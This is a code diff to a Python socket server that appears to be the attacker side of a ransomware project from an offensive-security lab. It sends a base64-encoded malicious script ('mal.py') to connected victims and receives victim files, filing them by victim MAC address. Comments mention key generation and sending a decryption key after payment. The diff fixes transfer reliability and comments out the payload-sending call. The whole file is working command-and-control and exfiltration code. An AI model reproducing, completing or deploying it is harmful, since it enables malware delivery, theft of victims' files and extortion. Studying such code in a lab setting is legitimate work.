@@ -83,34 +83,36 @@ class Server:
         data = file.read()
 
         encoded_payload = base64.b64encode('mal.py'.encode())
-        conn.send(encoded_payload)
+        conn.sendall(encoded_payload)
         msg = conn.recv(Server.MAX_SIZE).decode(Server.FORMAT)
         print("[CLIENT] : " + msg)
 
         #while data:
         #    print(len(data))
-        conn.send(base64.b64encode(data.encode(Server.FORMAT)))
+        conn.sendall(base64.b64encode(data.encode(Server.FORMAT)))
         #    data = file.read(1024)
         file.close()
-        conn.send(base64.b64encode("DONE.".encode(Server.FORMAT)))
+        conn.sendall(base64.b64encode("DONE.".encode(Server.FORMAT)))
         msg = conn.recv(Server.MAX_SIZE).decode(Server.FORMAT)
         print("[CLIENT] : " + msg)
 
-    def receive_victim_files(self, conn):
+    def receive_victim_files(self, conn, mac):
+        path = os.path.join(Server.WORKING_DIR, mac)
         filename = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
 
-        if filename == "DONE.":
+        if "DONE." in str(filename):
             self.TRANSFER_DONE = True
             return
         
+        file_loc = os.path.join(path, filename)
         print("[RECV] Receiving the filename.")
-        file = open(filename, "w")
-        conn.send(base64.b64encode("Filename received.".encode(Server.FORMAT)))
+        file = open(file_loc, "w")
+        conn.sendall(base64.b64encode("Filename received.".encode(Server.FORMAT)))
 
         data_file = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
         print("[RECV] Receiving the file data.")
         file.write(data_file)
-        conn.send(base64.b64encode("Filename received.".encode(Server.FORMAT)))
+        conn.sendall(base64.b64encode("Filename received.".encode(Server.FORMAT)))
 
         file.close() 
 
@@ -133,7 +135,7 @@ class Server:
                         else:
                             raise
 
-                    self.send_malicious_code(connection)
+                    #self.send_malicious_code(connection)
 
                     #priv, pub = self.generate_key_pair()
 
@@ -142,17 +144,20 @@ class Server:
                     #command to save the private and public key in /home/attacker/Lab-On-Offensive-Attack/VictimsData
 
                     #key_name = base64.b64encode('keyname'.encode(SERVER.FORMAT))
-                    #connection.send(key_name)
+                    #connection.sendall(key_name)
 
                     #key = base64.b64encode('key file'.encode(SERVER.FORMAT))
-                    #connection.send(key)
+                    #connection.sendall(key)
 
-                    while !self.TRANSFER_DONE:
-                        self.receive_victim_files(connection)
-
+                    while True:
+                        self.receive_victim_files(connection, victim_mac)
+                        print(self.TRANSFER_DONE)
+                        if self.TRANSFER_DONE == True:
+                            break
+                    break 
                     
                 else:
-                    # checks for payment  
+                    # sends decryption key  
                     print("its in")            
 
 
